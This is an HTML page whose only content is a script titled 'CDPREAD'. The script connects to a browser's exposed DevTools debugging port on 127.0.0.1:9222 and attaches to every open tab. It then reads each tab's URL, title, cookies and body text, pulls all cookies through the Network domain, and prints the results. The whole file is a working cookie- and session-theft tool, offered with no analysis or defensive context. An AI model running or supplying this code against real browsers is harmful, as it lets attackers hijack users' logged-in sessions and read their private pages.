<!doctype html><html><head><meta charset="utf-8"><title>CDPREAD</title>
<script>
const OUT=[];
function log(x){ try{ OUT.push(String(x)); var e=document.getElementById('r'); if(e) e.innerText=OUT.join('\n===\n'); }catch(_){} }
async function kick(){
  log('begin');
  const qs=new URLSearchParams(location.search);
  let wsUrl=qs.get('ws')||'ws://127.0.0.1:9222/devtools/browser/dee5b617-6f29-4237-82c6-ed425684f25e';
  log('ws='+wsUrl.slice(0,40));
  try{
    const ws=new WebSocket(wsUrl);
    const resp=new Map(); let n=100;
    ws.onmessage=(e)=>{try{const m=JSON.parse(e.data); if(m.id&&resp.has(m.id)){resp.get(m.id)(m);resp.delete(m.id);}}catch(_){}};
    function send(method,params,sid){const id=n++;return new Promise((res)=>{resp.set(id,res);const o={id,method};if(params)o.params=params;if(sid)o.sessionId=sid;ws.send(JSON.stringify(o));});}
    await new Promise((r,j)=>{ws.onopen=r;ws.onerror=()=>j('wserr');setTimeout(()=>j('timeout'),7000);});
    log('ws_open');
    const gt=await send('Target.getTargets');
    const ts=(gt.result&&gt.result.targetInfos)||[];
    log('targets='+ts.length);
    for(const t of ts){
      if(t.type!=='page') continue;
      try{
        const at=await send('Target.attachToTarget',{targetId:t.targetId,flatten:true});
        const sid=at.result.sessionId;
        const expr='JSON.stringify({u:location.href,t:document.title,c:document.cookie,b:(document.body&&document.body.innerText||"").slice(0,800)})';
        const ev=await send('Runtime.evaluate',{expression:expr,returnByValue:true},sid);
        const val=ev.result&&ev.result.result&&ev.result.result.value;
        log('TGT '+t.url+'\n'+val);
        // also get all cookies via Network
        try{ const ck=await send('Network.getCookies',{urls:[t.url]},sid); log('CK '+JSON.stringify(ck.result&&ck.result.cookies)); }catch(_){}
      }catch(ee){log('err '+t.url+' '+ee);}
    }
    log('DONE');
  }catch(e){log('FATAL:'+e);}
}
kick();
</script>
</head><body><pre id="r">pending</pre></body></html>
